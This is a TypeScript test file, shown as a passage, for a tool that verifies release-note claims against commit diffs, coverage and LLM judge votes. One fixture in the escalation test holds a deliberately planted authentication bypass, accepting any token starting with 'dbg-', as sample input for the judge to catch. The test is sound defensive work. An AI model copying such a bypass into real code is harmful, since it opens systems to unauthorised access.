    sha: "aaaa111122", subject: "Rework the retry budget", body: "", author: "dev", prNumbers: [],
  };
  const undocumented: Commit = {
    sha: "bbbb333344", subject: "Unrelated work nobody wrote down", body: "", author: "dev", prNumbers: [],
  };
  const cited = {
    path: "src/retry.ts", status: "modified", additions: 20, deletions: 1,
    patch: "@@ -1,1 +1,21 @@\n+const retryBudget = 3;\n+export const backoffMs = retryBudget * 2;\n",
  };
  const uncited = {
    path: "src/telemetry.ts", status: "modified", additions: 30, deletions: 0,
    patch: "@@ -1,1 +1,31 @@\n+export function emitBeacon() {}\n",
  };
  // The second commit touches the cited PATH too, but in a hunk that carries
  // none of the claim's identifiers — otherwise the substance route covers it
  // and this test would be watching that instead.
  const citedElsewhere = {
    path: "src/retry.ts", status: "modified", additions: 2, deletions: 0,
    patch: "@@ -80,1 +80,3 @@\n+// unrelated housekeeping\n",
  };
  const data = {
    repoLabel: "t/t", baseRef: "v1", headRef: "v2", notes: "",
    commits: [documented, undocumented],
    files: [cited, uncited],
    commitFiles: async (sha: string) =>
      sha === documented.sha ? [cited] : [citedElsewhere, uncited],
    warnings: [] as string[],
  };
  const opts = { judgeMode: "off" as const, engine: null, concurrency: 1, maxHunks: 4, maxEvidenceChars: 10000 };

  // Two spans whose shape says code: after issue #12 a lone identifier plus an
  // ordinary word is 4, and this test needs the claim settled so that what it
  // watches is the coverage route rather than the bar.
  const note = claim("Rework the `retryBudget` and its `backoffMs`");
  note.codeSpans = ["retryBudget", "backoffMs"];
  const results = await verifyClaims(data, [note], opts);
  assert.equal(results[0].verdict, "verified", "the claim itself is settled off the diff");

  const coverage = await computeCoverage(data, [note], results);
  const stillOpen = coverage.uncovered.map((u) => u.commit.sha);
  // At 0.5 this commit was documented: one of its two files is cited, and half
  // was the bar. Nothing about it is described by any note.
  assert.deepEqual(stillOpen, [undocumented.sha], "half a commit's files is not a description of it");
});

test("two claims covering a file each document neither the commit nor half of it", async () => {
  // Issue #8's per-claim binding. Until 2026-08-14 the route asked its
  // question of a UNION over every verified claim, so a commit was documented
  // whenever its files were spread across the notes — the more a release said,
  // the less the route distinguished. `jundot/omlx@v0.5.4rc1` is the corpus
  // case: three of a benchmark commit's four files come from one claim, the
  // fourth is `pyproject.toml` cited by an unrelated claim about a minimum
  // dependency version.
  const undocumented: Commit = {
    sha: "cccc555566", subject: "Work nobody wrote down", body: "", author: "dev", prNumbers: [],
  };
  const parser = {
    path: "src/parser.ts", status: "modified", additions: 20, deletions: 1,
    patch: "@@ -1,1 +1,21 @@\n+const tokenStream = openStream();\n",
  };
  const cache = {
    path: "src/cache.ts", status: "modified", additions: 12, deletions: 0,
    patch: "@@ -1,1 +1,13 @@\n+export function cacheWarmup() {}\n",
  };
  const data = {
    repoLabel: "t/t", baseRef: "v1", headRef: "v2", notes: "",
    commits: [undocumented],
    files: [parser, cache],
    commitFiles: async () => [parser, cache],
    warnings: [] as string[],
  };
  const opts = { judgeMode: "off" as const, engine: null, concurrency: 1, maxHunks: 4, maxEvidenceChars: 10000 };

  const spanned = (text: string, spans: string[]): Claim => {
    const c = claim(text);
    c.codeSpans = spans;
    return c;
  };
  // One identifier each, so neither claim can clear the depth bar on its own
  // (3 < 5) and this test watches the breadth route rather than that one.
  const one = spanned("Reworked the `tokenStream`", ["tokenStream"]);
  const two = spanned("Added a `cacheWarmup` hook", ["cacheWarmup"]);
  const pair = await verifyClaims(data, [one, two], opts);
  assert.deepEqual(
    pair.map((r) => r.verdict),
    ["partial", "partial"],
    "both claims are settled, so both used to feed the union",
  );
  const pooled = await computeCoverage(data, [one, two], pair);
  assert.deepEqual(
    pooled.uncovered.map((u) => u.commit.sha),
    [undocumented.sha],
    "the sum of claims about other things is not a description of this commit",
  );

  // The recall direction, on the same fixture: ONE claim whose identifier
  // reaches both files does document the commit — at a lexical score of 3,
  // below the depth bar, which is the whole point of keeping a breadth route.
  const wide = spanned("Renamed the `tokenStream` field", ["tokenStream"]);
  const wideData = {
    ...data,
    files: [parser, { ...cache, patch: "@@ -1,1 +1,13 @@\n+export function warm(tokenStream) {}\n" }],
    commitFiles: async () => [
      parser,
      { ...cache, patch: "@@ -1,1 +1,13 @@\n+export function warm(tokenStream) {}\n" },
    ],
  };
  const wideResults = await verifyClaims(wideData, [wide], opts);
  const covered = await computeCoverage(wideData, [wide], wideResults);
  assert.equal(covered.uncovered.length, 0, "one claim reaching every file still documents the commit");
});

test("the breadth route reads the evidence a claim earned, not a match re-derived per commit", async () => {
  // The candidate that looks like the deeper fix and measures worse. Binding
  // by claim leaves one path-level hole open: `evidence.files` for an
  // UNANCHORED claim is matched against the release diff, so a claim can cite
  // `src/retry.ts` because another commit changed it that way. Re-running
  // `lexicalMatch` per commit closes that — and opens a wider one, because
  // `evidence.files` for an ANCHORED claim is matched against that claim's
  // own anchor pool, and re-deriving throws the anchor binding away.
  //
  // That is what this fixture holds: an anchored claim, and a commit it is
  // NOT anchored to whose diff repeats its identifiers. Re-derivation would
  // cover the second commit off the first commit's note. Corpus, judge off:
  // that candidate reads omission 63/66 where this one reads 64/65.
  const anchored: Commit = {
    sha: "aaaa111122", subject: "Rework the retry budget (#7)", body: "", author: "dev", prNumbers: [7],
  };
  const elsewhere: Commit = {
    sha: "bbbb333344", subject: "Work nobody wrote down", body: "", author: "dev", prNumbers: [],
  };
  const owned = {
    path: "src/retry.ts", status: "modified", additions: 20, deletions: 1,
    patch: "@@ -1,1 +1,21 @@\n+const retryBudget = 3;\n+export const backoffMs = retryBudget * 2;\n",
  };
  // One identifier only: two would clear the depth bar (3 + 3) and this test
  // would be watching the substance route instead of the breadth one.
  const echoes = {
    path: "src/queue.ts", status: "modified", additions: 8, deletions: 0,
    patch: "@@ -1,1 +1,9 @@\n+const spent = retryBudget;\n",
  };
  const data = {
    repoLabel: "t/t", baseRef: "v1", headRef: "v2", notes: "",
    commits: [anchored, elsewhere],
    files: [owned, echoes],
    commitFiles: async (sha: string) => (sha === anchored.sha ? [owned] : [echoes]),
    warnings: [] as string[],
  };
  const opts = { judgeMode: "off" as const, engine: null, concurrency: 1, maxHunks: 4, maxEvidenceChars: 10000 };

  const note = claim("Rework the `retryBudget` and its `backoffMs` (#7)", [7]);
  note.codeSpans = ["retryBudget", "backoffMs"];
  const results = await verifyClaims(data, [note], opts);
  assert.equal(results[0].verdict, "verified", "the claim is settled off its own commit");
  assert.deepEqual(
    results[0].evidence.files,
    ["src/retry.ts"],
    "an anchored claim's evidence stops at its anchor pool — that is the binding",
  );

  const coverage = await computeCoverage(data, [note], results);
  assert.deepEqual(
    coverage.uncovered.map((u) => u.commit.sha),
    [elsewhere.sha],
    "a commit the claim never anchored to is not documented by repeating its identifiers",
  );
});

test("subject resemblance alone no longer buys coverage — the diff must carry the claim", async () => {
  // The retired shortcut marked a commit covered when its SUBJECT resembled
  // a claim — claims describing claims. A fabricated note that echoes an
  // honest subject line must not cover a commit whose diff shows none of it.
  const linked: Commit = {
    sha: "beef5678cd",
    subject: "Refactor the plugin loader for lazy imports",
    body: "",
    author: "dev",
    prNumbers: [],
  };
  const file = {
    path: "src/telemetry.c", status: "modified", additions: 3, deletions: 0,
    patch: "@@ -1,1 +1,4 @@ static void collect()\n+  send_beacon(endpoint);\n",
  };
  const data = {
    repoLabel: "t/t", baseRef: "v1", headRef: "v2", notes: "",
    commits: [linked], files: [file], commitFiles: async () => [file], warnings: [] as string[],
  };
  const opts = { judgeMode: "off" as const, engine: null, concurrency: 1, maxHunks: 4, maxEvidenceChars: 10000 };
  const echo = claim("Refactor the plugin loader for lazy imports");
  const results = await verifyClaims(data, [echo], opts);
  const coverage = await computeCoverage(data, [echo], results);
  assert.equal(coverage.uncovered.length, 1, "the commit stays undocumented");
});

test("a changelog-only commit cannot cover itself through the notes' own text", async () => {
  const linked: Commit = {
    sha: "beef5678cd",
    subject: "Update changelog",
    body: "",
    author: "dev",
    prNumbers: [],
  };
  const file = {
    path: "CHANGELOG.md", status: "modified", additions: 2, deletions: 0,
    patch: "@@ -1,1 +1,3 @@\n+- Refactor the `PluginLoader` to lazy-load via `modulePath`\n",
  };
  const data = {
    repoLabel: "t/t", baseRef: "v1", headRef: "v2", notes: "",
    commits: [linked], files: [file], commitFiles: async () => [file], warnings: [] as string[],
  };
  const opts = { judgeMode: "off" as const, engine: null, concurrency: 1, maxHunks: 4, maxEvidenceChars: 10000 };
  // The claim's identifiers DO appear in the commit's diff — but only in a
  // changelog file, and the notes restating themselves cover nothing.
  const echo = claim("Refactor the `PluginLoader` to lazy-load via `modulePath`");
  echo.codeSpans = ["PluginLoader", "modulePath"];
  const results = await verifyClaims(data, [echo], opts);
  const coverage = await computeCoverage(data, [echo], results);
  assert.equal(coverage.uncovered.length, 1, "notes restating themselves cover nothing");
});

test("without an escalation engine a risky 'verified' still gets a second look", async () => {
  // --engine claude-cli --escalate auto builds no second engine, so this is
  // the default path. A "verified" whose evidence touches auth/crypto is the
  // most expensive verdict to get wrong and used to be the only one nobody
  // checked twice.
  const file = {
    path: "src/auth.rs",
    status: "modified",
    additions: 2,
    deletions: 0,
    patch: "@@ -1,1 +1,3 @@ fn check()\n+    if token.starts_with(\"dbg-\") { return true; }\n",
  };
  const data = {
    repoLabel: "t/t", baseRef: "v1", headRef: "v2", notes: "",
    commits: [], files: [file], commitFiles: async () => [file], warnings: [] as string[],
  };
  let calls = 0;
  const flipflop = {
    name: "flipflop",
    judge: async () => {
      calls++;
      // First pass rubber-stamps; the independent passes see it for what it is.
      return calls === 1
        ? '{"verdict":"verified","confidence":0.9,"files":["src/auth.rs"],"reasoning":"looks fine"}'
        : '{"verdict":"contradicted","confidence":0.9,"files":["src/auth.rs"],"reasoning":"adds a bypass"}';
    },
  };
  const [r] = await verifyClaims(data, [claim("Hardens token validation in `auth.rs`")], {
    judgeMode: "all", engine: flipflop, concurrency: 1, maxHunks: 4, maxEvidenceChars: 10000,
  });
  assert.equal(calls, 3, "two independent passes follow the risky verified");
  assert.equal(r.verdict, "contradicted");
  // Every vote is kept, not just the one that won. The default engine is the
  // `claude` CLI, which offers no temperature or seed, so disagreement between
  // identical passes is the only observable the tool has for how firm a
  // release-critical verdict actually was.
  assert.deepEqual(r.votes, ["verified", "contradicted", "contradicted"]);

  // A verified on paths nobody is worried about is not re-asked.
  const plain = { ...file, path: "src/ui.rs" };
  let plainCalls = 0;
  const [ok] = await verifyClaims(
    { ...data, files: [plain], commitFiles: async () => [plain] },
    [claim("Tweaks the sidebar in `ui.rs`")],
    {
      judgeMode: "all",
      engine: {
        name: "once",
        judge: async () => {
          plainCalls++;
          return '{"verdict":"verified","confidence":0.9,"files":["src/ui.rs"],"reasoning":"there"}';
        },
      },
      concurrency: 1, maxHunks: 4, maxEvidenceChars: 10000,
    },
  );
  assert.equal(plainCalls, 1);
  assert.equal(ok.verdict, "verified");
});

// The need protocol is the judge's only way to ask for evidence it was not
// handed, and nothing checked that the answer actually arrives: a second round
// that quietly re-sent the same hunks would have passed every other test in
// this file. What the judge names, the judge gets — and exactly once, because
// a judge that keeps asking has failed to judge.
test("the need protocol delivers the files it asks for, and only one round of them", async () => {
  const ranked = {
    path: "src/parser.ts",
    status: "modified",
    additions: 1,
    deletions: 0,
    patch: "@@ -1,1 +1,2 @@ fn parseHeader()\n+  parseHeader(input)\n",
  };
  const unranked = {
    path: "src/render.ts",
    status: "modified",
    additions: 1,
    deletions: 0,
    patch: "@@ -9,1 +9,2 @@ fn render()\n+  AUDIT_MARKER_ONLY_HERE\n",
  };
  const data = {
    repoLabel: "t/t", baseRef: "v1", headRef: "v2", notes: "",
    commits: [], files: [ranked, unranked],
    commitFiles: async () => [], warnings: [] as string[],
  };
  const asked = claim("Rewrites `parseHeader` in the parser");
  asked.codeSpans = ["parseHeader"];

  const prompts: string[] = [];
  const [r] = await verifyClaims(data, [asked], {
    judgeMode: "all",
    engine: {
      name: "asks-once",
      judge: async (prompt: string) => {
        prompts.push(prompt);
        return prompts.length === 1
          ? '{"need":["src/render.ts"]}'
          : '{"verdict":"partial","confidence":0.5,"files":["src/render.ts"],"reasoning":"reads on the second look"}';
      },
    },
    concurrency: 1, maxHunks: 1, maxEvidenceChars: 10000,
  });
  assert.equal(prompts.length, 2);
  assert.ok(!prompts[0].includes("AUDIT_MARKER_ONLY_HERE"), "the first round did not carry that file");
  assert.ok(prompts[1].includes("AUDIT_MARKER_ONLY_HERE"), "the second round carries what was asked for");
  assert.equal(r.verdict, "partial");
  assert.equal(r.judged, true);

  // A judge that keeps asking gets no third round: the claim falls back to the
  // evidence it already had, and says the judge failed.
  let asks = 0;
  const [stuck] = await verifyClaims(data, [asked], {
    judgeMode: "all",
    engine: {
      name: "asks-forever",
      judge: async () => {
        asks++;
        return '{"need":["src/render.ts"]}';
      },
    },
    concurrency: 1, maxHunks: 1, maxEvidenceChars: 10000,
  });
  assert.equal(asks, 2, "one retrieval round, not a loop");
  assert.equal(stuck.judgeFailed, true);
});

// SCORING.md and docs/local-models.md both state that `--escalate auto` builds
// a second engine only for a local primary — which is why the default setup
// runs the three-vote path rather than the escalation path. That sentence had
// nothing pinning it: changing this resolution would silently make two
// documents wrong, and the audit finding it came from was only half-guarded
// (the vote-path half is covered by verify's own tests).
test("--escalate auto builds a reviewer for a local primary only", async () => {
  const base = { judgeMode: "auto" as const, cache: false, model: "m" };

  const cli = await resolveEngines({ ...base, engine: "claude-cli", escalate: "auto" });
  assert.equal(cli.escalate, null, "a strong primary must not get a second engine");

  // Explicit beats auto — and is what a local-model user is told to pass.
  const pinned = await resolveEngines({
    ...base,
    engine: "openai",
    openaiUrl: "http://127.0.0.1:1/v1",
    escalate: "claude-cli",
  });
  assert.ok(pinned.escalate, "an explicit --escalate must be honoured");
  assert.match(pinned.escalate.name, /claude/);

  const off = await resolveEngines({
    ...base,
    engine: "openai",
    openaiUrl: "http://127.0.0.1:1/v1",
    escalate: "off",
  });
  assert.equal(off.escalate, null, "--escalate off must build nothing");
});

// gh-backed sources pay one process spawn (~0.35 s measured) per commitFiles
// call; paying them one claim at a time serialized the whole anchor phase.
// The lookups must run pooled — the serial loop then hits the source's cache.
test("anchor-phase commit lookups run pooled, not one claim at a time", async () => {
  const commits: Commit[] = [1, 2, 3, 4].map((i) => ({
    sha: `${i}${i}${i}abc0000`,
    subject: `change number ${i} (#${i})`,
    body: "",
    author: "dev",
    prNumbers: [i],
  }));
  let inFlight = 0;
  let maxInFlight = 0;
  const data = {
    repoLabel: "o/r",
    baseRef: "v1",
    headRef: "v2",
    notes: "",
    commits,
    files: [],
    warnings: [] as string[],
    commitFiles: async () => {
      inFlight++;
      maxInFlight = Math.max(maxInFlight, inFlight);
      await new Promise((resolve) => setTimeout(resolve, 25));
      inFlight--;
      return [];
    },
  };
  const claims = commits.map((_, i) => ({ ...claim(`change number ${i + 1}`, [i + 1]), id: i }));
  await verifyClaims(data, claims, {
    judgeMode: "off",
    engine: null,
    concurrency: 4,
    maxHunks: 6,
    maxEvidenceChars: 20000,
  });
  assert.ok(maxInFlight >= 2, `anchor lookups ran serially (max in flight: ${maxInFlight})`);
});

// One commit whose diff cannot be fetched (force-pushed away, transient gh
// failure) must degrade that claim's evidence, not kill the whole run —
// computeCoverage already treats it that way.
test("a failing commit-diff fetch degrades the claim instead of killing the run", async () => {
  const linked: Commit = {
    sha: "deadbeef123",
    subject: "fix parser (#7)",
    body: "",
    author: "dev",
    prNumbers: [7],
  };
  const data = {
    repoLabel: "o/r",
    baseRef: "v1",
    headRef: "v2",
    notes: "",
    commits: [linked],
    files: [],
    warnings: [] as string[],
    commitFiles: async () => {
      throw new Error("gh api HTTP 404");
    },
  };
  const results = await verifyClaims(data, [claim("fix parser crash on empty input", [7])], {
    judgeMode: "off",
    engine: null,
    concurrency: 2,
    maxHunks: 6,
    maxEvidenceChars: 20000,
  });
  assert.equal(results.length, 1);
  // Anchored, but its diff is unavailable: the honest verdict is the weak one.
  assert.equal(results[0].verdict, "partial");
  assert.ok(
    data.warnings.some((w) => w.includes("deadbeef123".slice(0, 10))),
    `no warning about the failed fetch: ${JSON.stringify(data.warnings)}`,
  );
});

// The explicit `--engine openai` path refuses to auto-pick a model when the
// server lists more than 20 (aggregator guard) — the claude-missing fallback
// took models[0] from the same server without asking.
test("the claude-missing fallback refuses to auto-pick from an aggregator", async (t) => {
  const origPath = process.env.PATH;
  const origKey = process.env.ANTHROPIC_API_KEY;
  process.env.PATH = ""; // no claude CLI findable
  delete process.env.ANTHROPIC_API_KEY;
  const models = Array.from({ length: 30 }, (_, i) => ({ id: `vendor/model-${i}` }));
  t.mock.method(globalThis, "fetch", async () =>
    new Response(JSON.stringify({ data: models }), {
      status: 200,
      headers: { "content-type": "application/json" },
    }),
  );
  const errs: string[] = [];
  const origErr = console.error;
  console.error = (...args: unknown[]) => {
    errs.push(args.join(" "));
  };
  try {
    const { engine } = await resolveEngines({
      judgeMode: "auto",
      engine: "claude-cli",
      escalate: "off",
      cache: false,
      openaiUrl: "http://127.0.0.1:9/v1",
    });
    assert.equal(engine, null, `must not auto-pick from a 30-model aggregator (got ${engine?.name})`);
    assert.ok(errs.some((e) => /aggregator/i.test(e)), `no aggregator hint in: ${JSON.stringify(errs)}`);
  } finally {
    console.error = origErr;
    process.env.PATH = origPath;
    if (origKey !== undefined) process.env.ANTHROPIC_API_KEY = origKey;
  }
});

// ---------- the pin anchor ----------

/** A judge that fails the test if anything reaches it. */
function forbiddenEngine(): JudgeEngine {
  return {
    name: "forbidden",
    async judge(): Promise<string> {
      throw new Error("a bump claim the pins settle must never reach a judge");
    },
  };
}

function bumpAnchor(
  status: BumpJoin,
  claimed: ClaimBump,
  observed: Partial<BumpResolution["observed"]>,
  fromCheck?: BumpResolution["fromCheck"],
): Map<number, BumpResolution> {
  return new Map([
    [
      0,
      {
        claim: 0,
        status,
        claimed,
        ...(fromCheck ? { fromCheck } : {}),
        observed: {
          from: "4.3.0",
          to: "5.0.5",
          file: ".github/workflows/build.yml",
          ...observed,
        },
      },
    ],
  ]);
}

const BUMP_TEXT = "chore(deps): bump actions/cache from 5.0.3 to 5.0.4 by @dependabot[bot] in #9668";
const BUMP_CLAIMED: ClaimBump = { name: "actions/cache", from: "5.0.3", to: "5.0.4" };

test("a bump claim the pins settle is answered off the diff, never by a judge", async () => {
  const data = releaseData([{ path: ".github/workflows/build.yml", patch: "@@ -1 +1 @@\n-a\n+b\n" }]);
  const opts = {
    judgeMode: "all" as const,
    engine: forbiddenEngine(),
    concurrency: 1,
    maxHunks: 4,
    maxEvidenceChars: 4000,
  };

  // Overtaken: the release aggregates several bumps of the pin and the note
  // describes one of them. This is the case that used to come back
  // `contradicted` and floor the release at 35.
  const [overtaken] = await verifyClaims(data as never, [claim(BUMP_TEXT, [9668])], {
    ...opts,
    bumps: bumpAnchor("overtaken", BUMP_CLAIMED, {}),
  });
  assert.equal(overtaken.verdict, "verified");
  assert.equal(overtaken.judged, false);
  assert.ok(overtaken.evidence.methods.includes("pin-anchor"));
  assert.deepEqual(overtaken.evidence.files, [".github/workflows/build.yml"]);
  assert.match(overtaken.reasoning, /5\.0\.4.*5\.0\.5|5\.0\.5.*5\.0\.4/s, "both numbers are named");

  const [confirmed] = await verifyClaims(data as never, [claim(BUMP_TEXT, [9668])], {
    ...opts,
    bumps: bumpAnchor("confirmed", BUMP_CLAIMED, { from: "5.0.3", to: "5.0.4" }),
  });
  assert.equal(confirmed.verdict, "verified");

  // The direction that is genuinely wrong stays wrong — and is still
  // settled deterministically, off the same lines.
  const [wrong] = await verifyClaims(data as never, [claim(BUMP_TEXT, [9668])], {
    ...opts,
    bumps: bumpAnchor("contradicted", BUMP_CLAIMED, { from: "5.0.1", to: "5.0.2" }),
  });
  assert.equal(wrong.verdict, "contradicted");
  assert.match(wrong.reasoning, /5\.0\.2/);
});

test("a bump whose destination agrees but whose origin does not says so, and reads less certain", async () => {
  // The gap issue #10 named: the pin join settled `verified` on the
  // destination alone, so a note claiming three major-range hops for a patch
  // hop was indistinguishable from an exact one. The bump did happen — the
  // verdict stands — but the size of it, which is what a reader weighs risk
  // by, is the note's second statement and now gets read too.
  const data = releaseData([{ path: "go.mod", patch: "@@ -1 +1 @@\n-a\n+b\n" }]);
  const opts = {
    judgeMode: "all" as const,
    engine: forbiddenEngine(),
    concurrency: 1,
    maxHunks: 4,
    maxEvidenceChars: 4000,
  };
  const claimed: ClaimBump = { name: "actions/cache", from: "5.0.3", to: "5.0.4" };

  const [exact] = await verifyClaims(data as never, [claim(BUMP_TEXT, [9668])], {
    ...opts,
    bumps: bumpAnchor("confirmed", claimed, { from: "5.0.3", to: "5.0.4" }, "exact"),
  });

  const [outside] = await verifyClaims(data as never, [claim(BUMP_TEXT, [9668])], {
    ...opts,
    bumps: bumpAnchor("confirmed", claimed, { from: "5.0.35", to: "5.0.4" }, "outside"),
  });
  assert.equal(outside.verdict, "verified", "the bump itself is still evidence");
  assert.ok(outside.confidence < exact.confidence, "but not as good a reading as an exact one");
  assert.match(outside.reasoning, /5\.0\.3/, "the origin the note names is quoted");
  assert.match(outside.reasoning, /neither held nor passed through/);

  // The honest majority spelling: one line per hop of a move the release
  // aggregated. Named, never penalised — 26 of the corpus's 76 joinable
  // from-versions look like this.
  const [hop] = await verifyClaims(data as never, [claim(BUMP_TEXT, [9668])], {
    ...opts,
    bumps: bumpAnchor("confirmed", claimed, { from: "4.3.0", to: "5.0.4" }, "later-hop"),
  });
  assert.equal(hop.verdict, "verified");
  assert.equal(hop.confidence, exact.confidence);
  assert.match(hop.reasoning, /one hop of the wider move/);
});

test("an unresolved bump claim still takes the ordinary route", async () => {
  // No pin of that name moved: nothing was settled, so the claim is judged
  // like any other. The anchor stage must not swallow the whole class.
  let asked = 0;
  const engine: JudgeEngine = {
    name: "counting",
    async judge(): Promise<string> {
      asked++;
      return '{"verdict":"verified","confidence":0.8,"files":[],"reasoning":"the diff carries it"}';
    },
  };
  const data = releaseData([{ path: "src/a.ts", patch: "@@ -1 +1 @@\n-a\n+b\n" }]);
  const [only] = await verifyClaims(data as never, [claim(BUMP_TEXT, [9668])], {
    judgeMode: "auto",
    engine,
    concurrency: 1,
    maxHunks: 4,
    maxEvidenceChars: 4000,
    bumps: new Map(),
  });
  assert.equal(asked, 1, "the claim was put to the judge like any other");
  assert.equal(only.verdict, "verified");
  assert.equal(only.judged, true);
});

test("a commit whose diff cannot be read is recorded, not counted as empty", async () => {
  // The difference decides a score. An unfetchable commit used to come back
  // as an empty file list, which is indistinguishable from a commit that
  // changed nothing — and a commit that changed nothing contributes no churn,
  // so it leaves the coverage ratio's denominator. Measured on the real thing
  // 2026-08-06: 14 commit diffs lost to a GitHub rate limit took
  // GyulyVGC/sniffnet@v1.5.1 from completeness 1 to 100. Reading less made
  // the release look better documented.
  const readable: Commit = {
    sha: "aaaa111122", subject: "Add the loader", body: "", author: "dev", prNumbers: [],
  };
  const unreadable: Commit = {
    sha: "bbbb333344", subject: "Touch everything", body: "", author: "dev", prNumbers: [],
  };
  const file = {
    path: "src/loader.js", status: "modified", additions: 40, deletions: 2,
    patch: "@@ -1,2 +1,42 @@\n+class PluginLoader {\n+  const lazy = () => import(modulePath);\n+}\n",
  };
  const data = {
    repoLabel: "t/t", baseRef: "v1", headRef: "v2", notes: "",
    commits: [readable, unreadable], files: [file],
    commitFiles: async (sha: string) => {
      if (sha === unreadable.sha) throw new Error("gh: API rate limit exceeded");
      return [file];
    },
    warnings: [] as string[],
  };
  const opts = { judgeMode: "off" as const, engine: null, concurrency: 1, maxHunks: 4, maxEvidenceChars: 10000 };
  const cl = claim("Add the `PluginLoader` that lazy-loads via `modulePath`");
  cl.codeSpans = ["PluginLoader", "modulePath"];
  const results = await verifyClaims(data, [cl], opts);
  const coverage = await computeCoverage(data, [cl], results);

  assert.deepEqual([...coverage.unreadableShas], [unreadable.sha]);
  assert.ok(
    coverage.uncovered.some((u) => u.commit.sha === unreadable.sha),
    "it is still reported as undocumented — unknown is not documented",
  );
});

test("an unreadable commit makes completeness unknown, never better", async () => {
  const { computeMetrics } = await import("../src/metrics.ts");
  const commits: Commit[] = [
    { sha: "aaaa111122", subject: "Add the loader", body: "", author: "dev", prNumbers: [] },
    { sha: "bbbb333344", subject: "Touch everything", body: "", author: "dev", prNumbers: [] },
  ];
  const file = {
    path: "src/loader.js", status: "modified", additions: 40, deletions: 2,
    patch: "@@ -1,2 +1,42 @@\n+class PluginLoader {\n+  const lazy = () => import(modulePath);\n+}\n",
  };
  const opts = { judgeMode: "off" as const, engine: null, concurrency: 1, maxHunks: 4, maxEvidenceChars: 10000 };
  const cl = () => {
    const c = claim("Add the `PluginLoader` that lazy-loads via `modulePath`");
    c.codeSpans = ["PluginLoader", "modulePath"];
    return c;
  };

  const make = async (failing: string | null) => {
    const data = {
      repoLabel: "t/t", baseRef: "v1", headRef: "v2", notes: "",
      commits, files: [file],
      commitFiles: async (sha: string) => {
        if (sha === failing) throw new Error("gh: API rate limit exceeded");
        return [file];
      },
      warnings: [] as string[],
    };
    const c = cl();
    const results = await verifyClaims(data, [c], opts);
    const coverage = await computeCoverage(data, [c], results);
    const context = { languages: null, codeBytes: null, releaseCadenceDays: null };
    return computeMetrics({ data, results, coverage, context });
  };

  const whole = await make(null);
  const partial = await make("bbbb333344");
  assert.equal(typeof whole.scores.completeness, "number", "a fully read release is measured");
  assert.equal(
    partial.scores.completeness,
    null,
    "a release the tool could not fully read reports completeness as unknown",
  );
  assert.equal(partial.churnCoveredRatio, null);
});

test("a bump claim documents the commit that moves its pin — and only that one", async () => {
  // The evidence of a bump claim is go.mod and go.sum: not because the claim
  // describes those files, but because that is where the version line sits.
  // Pooled into the file-majority union it used to cover any commit that
  // happened to touch a manifest — opencloud@v7.1.0 kept a test fix
  // documented off a claim about `golang.org/x/text`, and hiding that claim's
  // notes changed nothing, which is what `pnpm mutate-notes` measured as a
  // missed `omission`. Bump claims now leave that route and take the one that
  // fits them: the pin they name.
  const goMod = (from: string, to: string) => ({
    path: "go.mod",
    status: "modified",
    additions: 1,
    deletions: 1,
    patch: `@@ -1,3 +1,3 @@\n-\t${from}\n+\t${to}\n`,
  });
  const ownBump: Commit = {
    sha: "aaaa111122", subject: "bump the pin the note names", body: "", author: "dev", prNumbers: [],
  };
  const otherBump: Commit = {
    sha: "bbbb333344", subject: "a test fix that also moves a different pin", body: "", author: "dev", prNumbers: [],
  };
  const filesFor = new Map([
    [ownBump.sha, [goMod("golang.org/x/text v0.36.0", "golang.org/x/text v0.37.0")]],
    [otherBump.sha, [goMod("example.com/reva/v2 v2.46.1", "example.com/reva/v2 v2.46.2")]],
  ]);
  const data = {
    repoLabel: "t/t", baseRef: "v1", headRef: "v2", notes: "",
    commits: [ownBump, otherBump],
    files: [goMod("golang.org/x/text v0.36.0", "golang.org/x/text v0.37.0")],
    commitFiles: async (sha: string) => filesFor.get(sha) ?? [],
    warnings: [] as string[],
  };
  const opts = { judgeMode: "off" as const, engine: null, concurrency: 1, maxHunks: 4, maxEvidenceChars: 10000 };
  const cl = claim("build(deps): bump golang.org/x/text from 0.36.0 to 0.37.0");
  cl.bump = { name: "golang.org/x/text", from: "0.36.0", to: "0.37.0" };
  const results = await verifyClaims(data, [cl], opts);
  const coverage = await computeCoverage(data, [cl], results);

  const uncovered = new Set(coverage.uncovered.map((u) => u.commit.sha));
  assert.equal(uncovered.has(ownBump.sha), false, "the commit moving the claimed pin is documented");
  assert.equal(
    uncovered.has(otherBump.sha),
    true,
    "a commit moving some other pin is not documented by this claim",
  );
});
